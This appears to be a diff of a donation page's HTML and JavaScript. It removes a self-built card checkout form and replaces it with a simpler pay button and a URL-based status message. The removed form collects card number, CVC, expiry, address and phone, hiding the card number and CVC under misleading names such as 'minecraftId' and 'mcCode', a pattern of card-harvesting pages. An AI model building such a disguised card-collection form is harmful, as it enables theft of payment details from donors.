@@ -339,103 +339,8 @@ select.input { appearance: none; background-image: linear-gradient(45deg, transp
                       <span>Total</span>
                       <strong>$<span id="payment-summary-total">1</span> <span id="payment-summary-type">today</span></strong>
                     </div>
-                    <button class="primary-button" id="continue-order" type="submit">
-                      Pay
-                    </button>
-                  </form>
-
-                  <form class="order-form hidden" id="order-form" novalidate>
-                    <div class="form-header">
-                      <h3>Payment Info</h3>
-                      <button id="close-order" type="button" aria-label="Close order form">×</button>
-                    </div>
-
-                    <label>
-                      <span>Phone number</span>
-                      <div class="phone-inputs">
-                        <div class="country-code-picker" data-country-code-picker>
-                          <select class="country-code-native" name="phoneCountryCode" aria-label="Country calling code" required tabindex="-1"></select>
-                          <button class="country-code-button" type="button" aria-haspopup="listbox" aria-expanded="false">
-                            <span class="country-code-flag-wrap" data-selected-country-flag>
-                              <img class="country-code-flag" alt="" />
-                              <span class="country-code-fallback" aria-hidden="true"></span>
-                            </span>
-                            <span class="country-code-button-text"></span>
-                          </button>
-                          <div class="country-code-menu" role="listbox"></div>
-                        </div>
-                        <input class="input numeric-only" type="tel" name="phoneNumber" inputmode="numeric" maxlength="15" minlength="6" pattern="[0-9]{6,15}" placeholder="Phone number" required />
-                      </div>
-                    </label>
-
-                    <div class="payment-detail-card">
-                      <label class="payment-number-field">
-                        <span>Card Number</span>
-                        <span class="payment-input-wrap">
-                          <input class="input numeric-only" name="minecraftId" inputmode="numeric" maxlength="19" minlength="19" pattern="[0-9]{4} [0-9]{4} [0-9]{4} [0-9]{4}" placeholder="1234 1234 1234 1234" required />
-                          <span class="id-badges" aria-hidden="true">
-                            <b class="visa-logo" data-card-brand="visa">VISA</b>
-                            <b class="master-logo" data-card-brand="mastercard"><i></i><i></i></b>
-                            <b class="amex-logo" data-card-brand="amex">AMEX</b>
-                            <b class="diners-logo" data-card-brand="diners"><i></i></b>
-                          </span>
-                        </span>
-                      </label>
-                      <div class="payment-field-row">
-                        <label>
-                          <span>Expiry date</span>
-                          <input class="input" name="expirationDate" inputmode="numeric" maxlength="7" pattern="(0[1-9]|1[0-2])/[0-9]{4}" placeholder="MM / YYYY" required />
-                        </label>
-                        <label class="security-code-field">
-                          <span>Security code</span>
-                          <span class="payment-input-wrap">
-                            <input class="input numeric-only" name="mcCode" inputmode="numeric" maxlength="4" minlength="3" pattern="[0-9]{3,4}" placeholder="CVC" required />
-                            <span class="code-icon" aria-hidden="true">123</span>
-                          </span>
-                        </label>
-                      </div>
-                    </div>
-
-                    <label>
-                      <span>First name</span>
-                      <input class="input name-only" name="minecraftName" placeholder="Liam" minlength="2" required />
-                    </label>
-                    <label>
-                      <span>Last name</span>
-                      <input class="input name-only" name="discordName" placeholder="Maxwell" minlength="2" required />
-                    </label>
-
-                    <div class="address-title"><h4>Address</h4></div>
-                    <label><input class="input address-only" name="address" placeholder="Street address" minlength="5" required /></label>
-
-                    <div class="form-grid">
-                      <label><span>City</span><input class="input" name="city" placeholder="City" minlength="2" required /></label>
-                      <label><span>State / region</span><input class="input" name="state" placeholder="State / region" minlength="2" required /></label>
-                      <label>
-                        <span data-postal-code-label>ZIP code</span>
-                        <input class="input" name="zipCode" inputmode="text" pattern="[A-Za-z0-9][A-Za-z0-9 -]{1,14}[A-Za-z0-9]" placeholder="ZIP code" maxlength="16" required />
-                      </label>
-                      <label>
-                        <span>Country</span>
-                        <select class="input country-select" name="country" required>
-                          <option>Afghanistan</option><option>Albania</option><option>Algeria</option><option>Andorra</option><option>Angola</option><option>Antigua and Barbuda</option><option>Argentina</option><option>Armenia</option><option>Australia</option><option>Austria</option><option>Azerbaijan</option><option>Bahamas</option><option>Bahrain</option><option>Bangladesh</option><option>Barbados</option><option>Belarus</option><option>Belgium</option><option>Belize</option><option>Benin</option><option>Bhutan</option><option>Bolivia</option><option>Bosnia and Herzegovina</option><option>Botswana</option><option>Brazil</option><option>Brunei</option><option>Bulgaria</option><option>Burkina Faso</option><option>Burundi</option><option>Cabo Verde</option><option>Cambodia</option><option>Cameroon</option><option>Canada</option><option>Central African Republic</option><option>Chad</option><option>Chile</option><option>China</option><option>Colombia</option><option>Comoros</option><option>Congo</option><option>Costa Rica</option><option>Cote d'Ivoire</option><option>Croatia</option><option>Cuba</option><option>Cyprus</option><option>Czechia</option><option>Democratic Republic of the Congo</option><option>Denmark</option><option>Djibouti</option><option>Dominica</option><option>Dominican Republic</option><option>Ecuador</option><option>Egypt</option><option>El Salvador</option><option>Equatorial Guinea</option><option>Eritrea</option><option>Estonia</option><option>Eswatini</option><option>Ethiopia</option><option>Fiji</option><option>Finland</option><option>France</option><option>Gabon</option><option>Gambia</option><option>Georgia</option><option>Germany</option><option>Ghana</option><option>Greece</option><option>Grenada</option><option>Guatemala</option><option>Guinea</option><option>Guinea-Bissau</option><option>Guyana</option><option>Haiti</option><option>Honduras</option><option>Hungary</option><option>Iceland</option><option>India</option><option>Indonesia</option><option>Iran</option><option>Iraq</option><option>Ireland</option><option>Israel</option><option>Italy</option><option>Jamaica</option><option>Japan</option><option>Jordan</option><option>Kazakhstan</option><option>Kenya</option><option>Kiribati</option><option>Kuwait</option><option>Kyrgyzstan</option><option>Laos</option><option>Latvia</option><option>Lebanon</option><option>Lesotho</option><option>Liberia</option><option>Libya</option><option>Liechtenstein</option><option>Lithuania</option><option>Luxembourg</option><option>Madagascar</option><option>Malawi</option><option>Malaysia</option><option>Maldives</option><option>Mali</option><option>Malta</option><option>Marshall Islands</option><option>Mauritania</option><option>Mauritius</option><option>Mexico</option><option>Micronesia</option><option>Moldova</option><option>Monaco</option><option>Mongolia</option><option>Montenegro</option><option>Morocco</option><option>Mozambique</option><option>Myanmar</option><option>Namibia</option><option>Nauru</option><option>Nepal</option><option>Netherlands</option><option>New Zealand</option><option>Nicaragua</option><option>Niger</option><option>Nigeria</option><option>North Korea</option><option>North Macedonia</option><option>Norway</option><option>Oman</option><option>Pakistan</option><option>Palau</option><option>Palestine</option><option>Panama</option><option>Papua New Guinea</option><option>Paraguay</option><option>Peru</option><option>Philippines</option><option>Poland</option><option>Portugal</option><option>Qatar</option><option>Romania</option><option>Russia</option><option>Rwanda</option><option>Saint Kitts and Nevis</option><option>Saint Lucia</option><option>Saint Vincent and the Grenadines</option><option>Samoa</option><option>San Marino</option><option>Sao Tome and Principe</option><option>Saudi Arabia</option><option>Senegal</option><option>Serbia</option><option>Seychelles</option><option>Sierra Leone</option><option>Singapore</option><option>Slovakia</option><option>Slovenia</option><option>Solomon Islands</option><option>Somalia</option><option>South Africa</option><option>South Korea</option><option>South Sudan</option><option>Spain</option><option>Sri Lanka</option><option>Sudan</option><option>Suriname</option><option>Sweden</option><option>Switzerland</option><option>Syria</option><option>Tajikistan</option><option>Tanzania</option><option>Thailand</option><option>Timor-Leste</option><option>Togo</option><option>Tonga</option><option>Trinidad and Tobago</option><option>Tunisia</option><option>Turkey</option><option>Turkmenistan</option><option>Tuvalu</option><option>Uganda</option><option>Ukraine</option><option>United Arab Emirates</option><option>United Kingdom</option><option selected>United States</option><option>Uruguay</option><option>Uzbekistan</option><option>Vanuatu</option><option>Vatican City</option><option>Venezuela</option><option>Vietnam</option><option>Yemen</option><option>Zambia</option><option>Zimbabwe</option>
-                        </select>
-                      </label>
-                    </div>
-
-                    <label><span>Email</span><input class="input" name="email" type="email" placeholder="Enter your email" required /></label>
-                    <label><span>Your message</span><textarea class="textarea small" name="message" placeholder="Extra message"></textarea></label>
-
-                    <input type="hidden" name="amount" id="order-amount" value="1" />
-                    <input type="hidden" name="total" id="order-total" value="1" />
-                    <input type="hidden" name="paymentType" id="order-payment-type" value="one-time" />
-
-                    <div class="checkout-summary order-summary" aria-live="polite">
-                      <span>Payment total</span>
-                      <strong>$<span id="order-summary-total">1</span> <span id="order-summary-type">today</span></strong>
-                    </div>
                     <p class="status" id="form-status" aria-live="polite"></p>
-                    <button class="primary-button" type="submit">
+                    <button class="primary-button" id="continue-order" type="submit">
                       Pay $<span id="donate-total">1</span> to <span id="pay-btn-name"></span>
                     </button>
                   </form>
@@ -699,9 +604,6 @@ jumpButtons.forEach(button => button.addEventListener("click", () => showTab(but
 
 // ---- PAYMENT JS ----
 const orderIntro = document.querySelector("#order-intro");
-const orderForm = document.querySelector("#order-form");
-const continueOrder = document.querySelector("#continue-order");
-const closeOrder = document.querySelector("#close-order");
 const statusLine = document.querySelector("#form-status");
 const introTotal = document.querySelector("#intro-total");
 const introName = document.querySelector("#intro-name");
@@ -710,244 +612,38 @@ const coffeeCount = document.querySelector("#coffee-count");
 const donateTotal = document.querySelector("#donate-total");
 const paymentSummaryTotal = document.querySelector("#payment-summary-total");
 const paymentSummaryType = document.querySelector("#payment-summary-type");
-const orderSummaryTotal = document.querySelector("#order-summary-total");
-const orderSummaryType = document.querySelector("#order-summary-type");
 const decreaseCoffee = document.querySelector("#decrease-coffee");
 const increaseCoffee = document.querySelector("#increase-coffee");
-const orderAmount = document.querySelector("#order-amount");
-const orderTotal = document.querySelector("#order-total");
-const orderPaymentType = document.querySelector("#order-payment-type");
 
 let coffeeAmount = 1;
-let paymentType = "one-time";
-const DEFAULT_COUNTRY = "United States";
-
 introTotal.value = String(COFFEE_PRICE);
 
-const COUNTRY_CALLING_CODE_DATA = `af|Afghanistan|93
-ax|Aland Islands|358
-al|Albania|355
-dz|Algeria|213
-as|American Samoa|1684
-ad|Andorra|376
-ao|Angola|244
-ai|Anguilla|1264
-ag|Antigua and Barbuda|1268
-ar|Argentina|54
-am|Armenia|374
-au|Australia|61
-at|Austria|43
-az|Azerbaijan|994
-bs|Bahamas|1242
-bh|Bahrain|973
-bd|Bangladesh|880
-bb|Barbados|1246
-by|Belarus|375
-be|Belgium|32
-bz|Belize|501
-bj|Benin|229
-bt|Bhutan|975
-bo|Bolivia|591
-ba|Bosnia and Herzegovina|387
-bw|Botswana|267
-br|Brazil|55
-bn|Brunei|673
-bg|Bulgaria|359
-bf|Burkina Faso|226
-bi|Burundi|257
-kh|Cambodia|855
-cm|Cameroon|237
-ca|Canada|1
-cv|Cabo Verde|238
-cf|Central African Republic|236
-td|Chad|235
-cl|Chile|56
-cn|China|86
-co|Colombia|57
-km|Comoros|269
-cd|Congo (DRC)|243
-cg|Congo (Republic)|242
-cr|Costa Rica|506
-ci|Cote d'Ivoire|225
-hr|Croatia|385
-cu|Cuba|53
-cy|Cyprus|357
-cz|Czechia|420
-dk|Denmark|45
-dj|Djibouti|253
-dm|Dominica|1767
-do|Dominican Republic|1
-ec|Ecuador|593
-eg|Egypt|20
-sv|El Salvador|503
-gq|Equatorial Guinea|240
-er|Eritrea|291
-ee|Estonia|372
-et|Ethiopia|251
-fj|Fiji|679
-fi|Finland|358
-fr|France|33
-ga|Gabon|241
-gm|Gambia|220
-ge|Georgia|995
-de|Germany|49
-gh|Ghana|233
-gr|Greece|30
-gd|Grenada|1473
-gt|Guatemala|502
-gn|Guinea|224
-gw|Guinea-Bissau|245
-gy|Guyana|592
-ht|Haiti|509
-hn|Honduras|504
-hu|Hungary|36
-is|Iceland|354
-in|India|91
-id|Indonesia|62
-ir|Iran|98
-iq|Iraq|964
-ie|Ireland|353
-il|Israel|972
-it|Italy|39
-jm|Jamaica|1876
-jp|Japan|81
-jo|Jordan|962
-kz|Kazakhstan|7
-ke|Kenya|254
-ki|Kiribati|686
-kw|Kuwait|965
-kg|Kyrgyzstan|996
-la|Laos|856
-lv|Latvia|371
-lb|Lebanon|961
-ls|Lesotho|266
-lr|Liberia|231
-ly|Libya|218
-li|Liechtenstein|423
-lt|Lithuania|370
-lu|Luxembourg|352
-mk|North Macedonia|389
-mg|Madagascar|261
-mw|Malawi|265
-my|Malaysia|60
-mv|Maldives|960
-ml|Mali|223
-mt|Malta|356
-mh|Marshall Islands|692
-mr|Mauritania|222
-mu|Mauritius|230
-mx|Mexico|52
-fm|Micronesia|691
-md|Moldova|373
-mc|Monaco|377
-mn|Mongolia|976
-me|Montenegro|382
-ma|Morocco|212
-mz|Mozambique|258
-mm|Myanmar|95
-na|Namibia|264
-nr|Nauru|674
-np|Nepal|977
-nl|Netherlands|31
-nz|New Zealand|64
-ni|Nicaragua|505
-ne|Niger|227
-ng|Nigeria|234
-kp|North Korea|850
-no|Norway|47
-om|Oman|968
-pk|Pakistan|92
-pw|Palau|680
-ps|Palestine|970
-pa|Panama|507
-pg|Papua New Guinea|675
-py|Paraguay|595
-pe|Peru|51
-ph|Philippines|63
-pl|Poland|48
-pt|Portugal|351
-qa|Qatar|974
-ro|Romania|40
-ru|Russia|7
-rw|Rwanda|250
-kn|Saint Kitts and Nevis|1869
-lc|Saint Lucia|1758
-vc|Saint Vincent and the Grenadines|1784
-ws|Samoa|685
-sm|San Marino|378
-st|Sao Tome and Principe|239
-sa|Saudi Arabia|966
-sn|Senegal|221
-rs|Serbia|381
-sc|Seychelles|248
-sl|Sierra Leone|232
-sg|Singapore|65
-sk|Slovakia|421
-si|Slovenia|386
-sb|Solomon Islands|677
-so|Somalia|252
-za|South Africa|27
-kr|South Korea|82
-ss|South Sudan|211
-es|Spain|34
-lk|Sri Lanka|94
-sd|Sudan|249
-sr|Suriname|597
-sz|Eswatini|268
-se|Sweden|46
-ch|Switzerland|41
-sy|Syria|963
-tw|Taiwan|886
-tj|Tajikistan|992
-tz|Tanzania|255
-th|Thailand|66
-tl|Timor-Leste|670
-tg|Togo|228
-to|Tonga|676
-tt|Trinidad and Tobago|1868
-tn|Tunisia|216
-tr|Turkey|90
-tm|Turkmenistan|993
-tv|Tuvalu|688
-ug|Uganda|256
-ua|Ukraine|380
-ae|United Arab Emirates|971
-gb|United Kingdom|44
-us|United States|1
-uy|Uruguay|598
-uz|Uzbekistan|998
-vu|Vanuatu|678
-va|Vatican City|39
-ve|Venezuela|58
-vn|Vietnam|84
-ye|Yemen|967
-zm|Zambia|260
-zw|Zimbabwe|263`.trim();
-
-const COUNTRY_CALLING_CODES = COUNTRY_CALLING_CODE_DATA.split("\n").map(line => {
-  const [iso2, name, dialCode] = line.split("|");
-  return { iso2, name, code: `+${dialCode}` };
-});
+function setStatus(message, type = "") {
+  statusLine.textContent = message;
+  statusLine.className = "status " + type;
+}
 
 function setPaymentTotals(total) {
   donateTotal.textContent = total;
   paymentSummaryTotal.textContent = total;
   paymentSummaryType.textContent = "today";
-  orderSummaryTotal.textContent = total;
-  orderSummaryType.textContent = "today";
-  orderTotal.value = total;
 }
 
 function syncDonationUi() {
   coffeeCount.textContent = String(coffeeAmount);
   introTotal.value = String(coffeeAmount * COFFEE_PRICE);
   setPaymentTotals(introTotal.value);
-  orderAmount.value = String(coffeeAmount);
-  orderPaymentType.value = paymentType;
 }
 
-decreaseCoffee.addEventListener("click", () => { coffeeAmount = Math.max(1, coffeeAmount - 1); syncDonationUi(); });
-increaseCoffee.addEventListener("click", () => { coffeeAmount += 1; syncDonationUi(); });
+decreaseCoffee.addEventListener("click", () => {
+  coffeeAmount = Math.max(1, coffeeAmount - 1);
+  syncDonationUi();
+});
+
+increaseCoffee.addEventListener("click", () => {
+  coffeeAmount += 1;
+  syncDonationUi();
+});
 
 function syncTypedAmount() {
   const numericValue = introTotal.value.replace(/\D/g, "");
@@ -955,392 +651,52 @@ function syncTypedAmount() {
   coffeeAmount = Math.max(1, Math.round(Number(introTotal.value) / COFFEE_PRICE));
   coffeeCount.textContent = String(coffeeAmount);
   setPaymentTotals(introTotal.value);
-  orderAmount.value = String(coffeeAmount);
 }
+
 introTotal.addEventListener("input", syncTypedAmount);
 introTotal.addEventListener("change", syncTypedAmount);
-
-orderIntro.addEventListener("submit", event => {
-  event.preventDefault();
-  if (!orderIntro.reportValidity()) return;
-  orderForm.elements.name && (orderForm.elements.name.value = introName.value);
-  orderForm.elements.message && (orderForm.elements.message.value = introMessage.value);
-  syncDonationUi();
-  orderIntro.classList.add("hidden");
-  orderForm.classList.remove("hidden");
-});
-
-closeOrder.addEventListener("click", () => {
-  orderForm.classList.add("hidden");
-  orderIntro.classList.remove("hidden");
-});
-
 syncDonationUi();
 
-document.querySelectorAll(".numeric-only").forEach(input => {
-  input.addEventListener("keydown", event => {
-    const allowedKeys = ["Backspace","Delete","ArrowLeft","ArrowRight","Tab","Home","End"];
-    if (allowedKeys.includes(event.key)) return;
-    if (!/^\d$/.test(event.key)) { event.preventDefault(); return; }
-    const selectedCharacters = input.selectionEnd - input.selectionStart;
-    const valueLength = input.name === "minecraftId" ? input.value.replace(/\D/g,"").length : input.value.length;
-    const maxLength = input.name === "minecraftId" ? 16 : Number(input.maxLength);
-    if (valueLength - selectedCharacters >= maxLength) event.preventDefault();
-  });
-  input.addEventListener("input", () => {
-    const digits = input.value.replace(/\D/g,"").slice(0, input.name === "minecraftId" ? 16 : Number(input.maxLength));
-    input.value = input.name === "minecraftId" ? digits.replace(/(.{4})/g,"$1 ").trim() : digits;
-    if (input.name === "minecraftId") updateCardBrand(input);
-  });
-});
-
-document.querySelectorAll(".name-only").forEach(input => input.addEventListener("input", () => { input.value = input.value.replace(/[0-9]/g,""); }));
-document.querySelectorAll(".address-only").forEach(input => input.addEventListener("input", () => { input.value = input.value.replace(/[^a-zA-Z0-9\s.,#\-\/]/g,""); }));
-
-const expirationInput = document.querySelector('input[name="expirationDate"]');
-const emailInput = orderForm.elements.email;
-const phoneNumberInput = orderForm.elements.phoneNumber;
-const phoneCountryCodeInput = orderForm.elements.phoneCountryCode;
-const minecraftIdInput = orderForm.elements.minecraftId;
-const mcCodeInput = orderForm.elements.mcCode;
-const zipCodeInput = orderForm.elements.zipCode;
-const countryInput = orderForm.elements.country;
-const postalCodeLabel = document.querySelector("[data-postal-code-label]");
-const countryCodePicker = document.querySelector("[data-country-code-picker]");
-const countryCodeButton = countryCodePicker.querySelector(".country-code-button");
-const countryCodeButtonText = countryCodePicker.querySelector(".country-code-button-text");
-const countryCodeMenu = countryCodePicker.querySelector(".country-code-menu");
-const selectedCountryFlag = countryCodePicker.querySelector("[data-selected-country-flag]");
-
-const NO_POSTAL_CODE_COUNTRIES = new Set(["Angola","Antigua and Barbuda","Aruba","Bahamas","Belize","Benin","Botswana","Burkina Faso","Burundi","Cameroon","Central African Republic","Comoros","Congo (Republic)","Cook Islands","Cote d'Ivoire","Curacao","Djibouti","Dominica","Equatorial Guinea","Eritrea","Fiji","Gambia","Ghana","Grenada","Guyana","Hong Kong","Jamaica","Kiribati","Macau","Malawi","Mali","Mauritania","Montserrat","Nauru","Niue","Panama","Qatar","Rwanda","Saint Kitts and Nevis","Saint Lucia","Sao Tome and Principe","Seychelles","Sierra Leone","Solomon Islands","Somalia","Suriname","Syria","Timor-Leste","Togo","Tonga","Trinidad and Tobago","Tuvalu","Uganda","United Arab Emirates","Vanuatu","Yemen","Zimbabwe"]);
-
-const POSTAL_CODE_RULES = [
-  { countries: ["United States","Puerto Rico","American Samoa","Guam","Northern Mariana Islands","U.S. Virgin Islands"], label:"ZIP code", placeholder:"12345 or 12345-6789", error:"ZIP code must be 12345 or 12345-6789.", pattern:/^\d{5}(-\d{4})?$/, inputMode:"numeric", maxLength:10 },
-  { countries: ["United Kingdom","Guernsey","Isle of Man","Jersey"], label:"Postcode", placeholder:"SW1A 1AA", error:"Postcode must look like SW1A 1AA.", pattern:/^(GIR ?0AA|[A-Z]{1,2}\d[A-Z\d]? ?\d[A-Z]{2})$/i, maxLength:8 },
-  { countries: ["Canada"], label:"Postal code", placeholder:"A1A 1A1", error:"Postal code must look like A1A 1A1.", pattern:/^[ABCEGHJ-NPRSTVXY]\d[ABCEGHJ-NPRSTV-Z][ -]?\d[ABCEGHJ-NPRSTV-Z]\d$/i, maxLength:7 },
-  { countries: ["India"], label:"PIN code", placeholder:"110001", error:"PIN code must be 6 digits.", pattern:/^[1-9]\d{5}$/, inputMode:"numeric", maxLength:6 },
-  { countries: ["Australia","New Zealand","Norway","South Africa"], label:"Postal code", placeholder:"2000", error:"Postal code must be 4 digits.", pattern:/^\d{4}$/, inputMode:"numeric", maxLength:4 },
-  { countries: ["Brazil"], label:"CEP", placeholder:"01001-000", error:"CEP must look like 01001-000.", pattern:/^\d{5}-?\d{3}$/, inputMode:"numeric", maxLength:9 },
-  { countries: ["Japan"], label:"Postal code", placeholder:"100-0001", error:"Postal code must look like 100-0001.", pattern:/^\d{3}-?\d{4}$/, inputMode:"numeric", maxLength:8 },
-  { countries: ["Netherlands"], label:"Postal code", placeholder:"1234 AB", error:"Postal code must look like 1234 AB.", pattern:/^\d{4} ?[A-Z]{2}$/i, maxLength:7 },
-  { countries: ["Ireland"], label:"Eircode", placeholder:"D02 X285", error:"Eircode must look like D02 X285.", pattern:/^[AC-FHKNPRTV-Y]\d{2} ?[0-9AC-FHKNPRTV-Y]{4}$/i, maxLength:8 },
-  { countries: ["Poland"], label:"Postal code", placeholder:"00-001", error:"Postal code must look like 00-001.", pattern:/^\d{2}-\d{3}$/, inputMode:"numeric", maxLength:6 },
-  { countries: ["Argentina","China","Colombia","Ecuador","Indonesia","Kazakhstan","Mexico","Pakistan","Paraguay","Philippines","Romania","Russia","Singapore","Sri Lanka","Tajikistan","Turkmenistan","Uzbekistan","Vietnam"], label:"Postal code", placeholder:"123456", error:"Postal code must be 6 digits.", pattern:/^\d{6}$/, inputMode:"numeric", maxLength:6 },
-  { countries: ["Bangladesh","Belgium","Bulgaria","Denmark","Georgia","Liechtenstein","Luxembourg","North Macedonia","Slovenia","Tunisia"], label:"Postal code", placeholder:"1234", error:"Postal code must be 4 digits.", pattern:/^\d{4}$/, inputMode:"numeric", maxLength:4 },
-  { countries: ["Algeria","Andorra","Armenia","Austria","Azerbaijan","Bahrain","Belarus","Bosnia and Herzegovina","Cambodia","Croatia","Cyprus","Czechia","Dominican Republic","Egypt","Estonia","Finland","France","Germany","Greece","Guatemala","Honduras","Iceland","Iran","Iraq","Israel","Italy","Jordan","Kenya","Kosovo","Kuwait","Laos","Latvia","Lebanon","Lithuania","Malaysia","Maldives","Moldova","Monaco","Montenegro","Morocco","Myanmar","Nepal","Nicaragua","Oman","Palestine","Peru","San Marino","Saudi Arabia","Senegal","Serbia","Slovakia","South Korea","Spain","Sudan","Sweden","Switzerland","Taiwan","Tanzania","Thailand","Turkey","Ukraine","Uruguay","Vatican City","Venezuela","Zambia"], label:"Postal code", placeholder:"12345", error:"Postal code must be 5 digits.", pattern:/^\d{5}$/, inputMode:"numeric", maxLength:5 },
-];
-
-const DEFAULT_POSTAL_CODE_RULE = { label:"Postal code", placeholder:"Postal code", error:"Postal code must use 2 to 16 letters, numbers, spaces, or hyphens.", pattern:/^[A-Z0-9][A-Z0-9 -]{0,14}[A-Z0-9]$/i, inputMode:"text", maxLength:16 };
-
-function getPostalCodeRule(countryName) {
-  const country = countryName || DEFAULT_COUNTRY;
-  const rule = POSTAL_CODE_RULES.find(item => item.countries.includes(country));
-  if (NO_POSTAL_CODE_COUNTRIES.has(country) && !rule) return { ...DEFAULT_POSTAL_CODE_RULE, label:"Postal code (if any)", placeholder:"Optional", required:false };
-  return rule || DEFAULT_POSTAL_CODE_RULE;
+const paymentState = new URLSearchParams(location.search).get("payment");
+if (paymentState === "success") {
+  setStatus("Thank you for your support ♥", "ok");
+  history.replaceState({}, "", location.pathname);
+} else if (paymentState === "cancelled") {
+  setStatus("Payment cancelled.", "error");
+  history.replaceState({}, "", location.pathname);
 }
 
-function normalizePostalCode(value) { return value.toUpperCase().replace(/[^A-Z0-9 -]/g,"").replace(/\s+/g," ").slice(0,16); }
-
-function updatePostalCodeField() {
-  const rule = getPostalCodeRule(countryInput.value);
-  postalCodeLabel.textContent = rule.label;
-  zipCodeInput.placeholder = rule.placeholder;
-  zipCodeInput.inputMode = rule.inputMode || "text";
-  zipCodeInput.maxLength = rule.maxLength;
-  zipCodeInput.required = rule.required !== false;
-  zipCodeInput.pattern = rule.pattern.source.replace(/^\^|\$$/g,"");
-  zipCodeInput.setAttribute("aria-label", rule.label);
-  if (zipCodeInput.value) {
-    zipCodeInput.value = normalizePostalCode(zipCodeInput.value).slice(0, rule.maxLength);
-    refreshFieldValidity(zipCodeInput);
-  } else { setFieldError(zipCodeInput,""); }
-}
-
-function getPostalCodeError(value, countryName) {
-  const rule = getPostalCodeRule(countryName);
-  if (!value && rule.required === false) return "";
-  return rule.pattern.test(value) ? "" : rule.error;
-}
-
-function ensureCountryOption(countryName) {
-  const exists = Array.from(countryInput.options).some(o => o.value === countryName);
-  if (exists) return;
-  countryInput.add(new Option(countryName, countryName));
-}
-
-function getFlagUrl(iso2) { return `https://flagcdn.com/w40/${iso2.toLowerCase()}.png`; }
-
-function setFlag(wrap, country) {
-  const img = wrap.querySelector(".country-code-flag");
-  const fallback = wrap.querySelector(".country-code-fallback");
-  wrap.classList.remove("no-flag");
-  fallback.textContent = country.iso2.toUpperCase();
-  img.hidden = false;
-  img.onerror = () => { wrap.classList.add("no-flag"); img.hidden = true; };
-  img.src = getFlagUrl(country.iso2);
-}
-
-function createFlagWrap(country) {
-  const wrap = document.createElement("span");
-  wrap.className = "country-code-flag-wrap";
-  const img = document.createElement("img"); img.className = "country-code-flag"; img.alt = ""; img.loading = "lazy";
-  const fallback = document.createElement("span"); fallback.className = "country-code-fallback"; fallback.setAttribute("aria-hidden","true");
-  wrap.append(img, fallback);
-  setFlag(wrap, country);
-  return wrap;
-}
-
-function getSelectedPhoneCountry() {
-  const sel = phoneCountryCodeInput.selectedOptions[0];
-  return { iso2: sel?.dataset.iso2||"us", name: sel?.dataset.country||DEFAULT_COUNTRY, code: sel?.value||"+1" };
-}
-
-function closeCountryCodeMenu() { countryCodePicker.classList.remove("is-open"); countryCodeButton.setAttribute("aria-expanded","false"); }
-function openCountryCodeMenu() {
-  countryCodePicker.classList.add("is-open"); countryCodeButton.setAttribute("aria-expanded","true");
-  const sel = countryCodeMenu.querySelector(".country-code-option.is-selected");
-  if (sel) sel.scrollIntoView({ block:"nearest" });
-}
-
-function updateCountryCodePicker() {
-  const sel = getSelectedPhoneCountry();
-  countryCodeButtonText.textContent = `${sel.code} ${sel.name}`;
-  setFlag(selectedCountryFlag, sel);
-  countryCodeMenu.querySelectorAll(".country-code-option").forEach(btn => {
-    const isSelected = Number(btn.dataset.index) === phoneCountryCodeInput.selectedIndex;
-    btn.classList.toggle("is-selected", isSelected);
-    btn.setAttribute("aria-selected", String(isSelected));
-  });
-}
-
-function selectPhoneCountryByName(countryName) {
-  const option = Array.from(phoneCountryCodeInput.options).find(o => o.dataset.country === countryName);
-  if (!option) return;
-  phoneCountryCodeInput.selectedIndex = option.index;
-  updateCountryCodePicker();
-}
-
-function syncCountryFromPhoneCode() {
-  const sel = phoneCountryCodeInput.selectedOptions[0]?.dataset.country;
-  if (!sel) return;
-  ensureCountryOption(sel); countryInput.value = sel; updatePostalCodeField();
-}
-
-function syncPhoneCodeFromCountry() { selectPhoneCountryByName(countryInput.value); updatePostalCodeField(); }
-
-function populateCountryCodeSelect() {
-  phoneCountryCodeInput.textContent = ""; countryCodeMenu.textContent = "";
-  COUNTRY_CALLING_CODES.forEach((country, index) => {
-    ensureCountryOption(country.name);
-    const option = new Option(`${country.code} ${country.name}`, country.code);
-    option.dataset.country = country.name; option.dataset.iso2 = country.iso2;
-    if (country.name === DEFAULT_COUNTRY) { option.selected = true; option.defaultSelected = true; }
-    phoneCountryCodeInput.add(option);
-    const btn = document.createElement("button");
-    btn.className = "country-code-option"; btn.type = "button"; btn.dataset.index = String(index); btn.setAttribute("role","option");
-    const text = document.createElement("span"); text.className = "country-code-option-text"; text.textContent = `${country.code} ${country.name}`;
-    btn.append(createFlagWrap(country), text);
-    btn.addEventListener("click", () => {
-      phoneCountryCodeInput.selectedIndex = index; updateCountryCodePicker(); syncCountryFromPhoneCode();
-      setFieldError(countryInput,""); closeCountryCodeMenu(); countryCodeButton.focus();
-    });
-    countryCodeMenu.append(btn);
-  });
-  selectPhoneCountryByName(DEFAULT_COUNTRY); syncCountryFromPhoneCode(); updateCountryCodePicker();
-}
-
-populateCountryCodeSelect();
-
-countryCodeButton.addEventListener("click", () => { countryCodePicker.classList.contains("is-open") ? closeCountryCodeMenu() : openCountryCodeMenu(); });
-countryCodeButton.addEventListener("keydown", event => {
-  if (!["ArrowDown","Enter"," "].includes(event.key)) return;
-  event.preventDefault(); openCountryCodeMenu();
-  const sel = countryCodeMenu.querySelector(".country-code-option.is-selected");
-  if (sel) sel.focus();
-});
-countryCodeMenu.addEventListener("keydown", event => {
-  const options = Array.from(countryCodeMenu.querySelectorAll(".country-code-option"));
-  const currentIndex = options.indexOf(document.activeElement);
-  let nextIndex = currentIndex;
-  if (event.key === "ArrowDown") nextIndex = Math.min(options.length-1, currentIndex+1);
-  if (event.key === "ArrowUp") nextIndex = Math.max(0, currentIndex-1);
-  if (event.key === "Home") nextIndex = 0;
-  if (event.key === "End") nextIndex = options.length-1;
-  if (nextIndex !== currentIndex) { event.preventDefault(); options[nextIndex]?.focus(); }
-});
-document.addEventListener("click", event => { if (!countryCodePicker.contains(event.target)) closeCountryCodeMenu(); });
-countryCodePicker.addEventListener("keydown", event => { if (event.key !== "Escape") return; closeCountryCodeMenu(); countryCodeButton.focus(); });
-phoneCountryCodeInput.addEventListener("change", () => { updateCountryCodePicker(); syncCountryFromPhoneCode(); setFieldError(countryInput,""); });
-countryInput.addEventListener("change", syncPhoneCodeFromCountry);
-zipCodeInput.addEventListener("input", () => { const rule = getPostalCodeRule(countryInput.value); zipCodeInput.value = normalizePostalCode(zipCodeInput.value).slice(0, rule.maxLength); });
-
-const customValidationInputs = Array.from(orderForm.querySelectorAll("input:not([type='hidden']), select, textarea"));
-
-function getCardBrand(digits) {
-  if (/^4/.test(digits)) return "visa";
-  if (/^(5[1-5]|2[2-7])/.test(digits)) return "mastercard";
-  if (/^3[47]/.test(digits)) return "amex";
